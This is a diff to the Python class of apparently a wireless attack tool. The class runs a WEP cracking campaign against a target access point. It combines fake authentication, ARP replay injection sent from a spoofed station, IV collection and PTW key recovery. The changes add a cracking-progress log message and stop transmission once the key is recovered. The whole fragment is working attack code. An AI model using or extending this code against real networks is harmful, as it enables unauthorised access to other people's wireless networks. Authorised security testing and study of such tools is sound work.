@@ -57,20 +57,19 @@ class WepCampaign:
         self._log = log_callback or (lambda _m: None)
         self._active = False
 
-        # Native PTW cracker, fed incrementally from the collector's crack
-        # samples and re-attempted as more IVs arrive. recover() can spend a
-        # second or two in the fudge search, so it runs in an executor — never
-        # on the UI event loop.
+        # Native PTW cracker, fed incrementally from the store's crack samples
+        # (votes are additive) and re-attempted as more IVs arrive.
         self.cracker = PtwCracker()
         self.recovered_key: Optional[bytes] = None
         self._crack_cursor = 0
+        self._crack_started = False
         self._crack_task: Optional[asyncio.Task] = None
 
         self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
         self.replay = WepArpReplay(
             iface,
             target,
-            iface.wep_collector,
+            iface.wep_store,
             # Replays are re-addressed to come FROM our associated fake-auth STA.
             source_mac=self.fake_auth.source_mac,
             # Only burst while we're actually associated.
@@ -114,18 +113,24 @@ class WepCampaign:
 
     async def _crack_loop(self) -> None:
         """Feed new crack samples to the PTW cracker and re-attempt recovery as
-        IVs accumulate. The recovery search runs in an executor so a multi-
-        second fudge search never stalls the UI."""
+        IVs accumulate. recover() runs in an executor (cracking can spin for a
+        few seconds). On success we stop the TX — once we have the key there's
+        no reason to keep injecting."""
         try:
             while self._active and self.recovered_key is None:
                 await asyncio.sleep(3.0)
-                samples = self.iface.wep_collector.crack_samples(self.target.bssid)
-                # Feed only the IVs we haven't fed yet (votes are additive).
+                samples = self.iface.wep_store.crack_samples(self.target.bssid)
                 for iv, cipher in samples[self._crack_cursor:]:
                     self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
                 self._crack_cursor = len(samples)
                 if not self.cracker.ready:
                     continue
+                if not self._crack_started:
+                    self._crack_started = True
+                    self._log(
+                        f"[cyan]→ Cracking[/cyan] — {self.cracker.sample_count:,} "
+                        f"IVs collected, attempting key recovery…"
+                    )
                 key = await asyncio.get_event_loop().run_in_executor(
                     None, self.cracker.recover
                 )
@@ -135,6 +140,12 @@ class WepCampaign:
                         f"[bold green]✓ WEP KEY RECOVERED:[/bold green] "
                         f"[bold]{key.hex()}[/bold] "
                         f"[dim]({_ascii_hint(key)})[/dim]"
+                    )
+                    # Done — stop transmitting (replay + fake-auth keepalive).
+                    self.replay.stop()
+                    self.fake_auth.stop()
+                    self._log(
+                        "[dim]Stopped TX — key recovered. Press 'c' to copy.[/dim]"
                     )
                     return
         except asyncio.CancelledError:
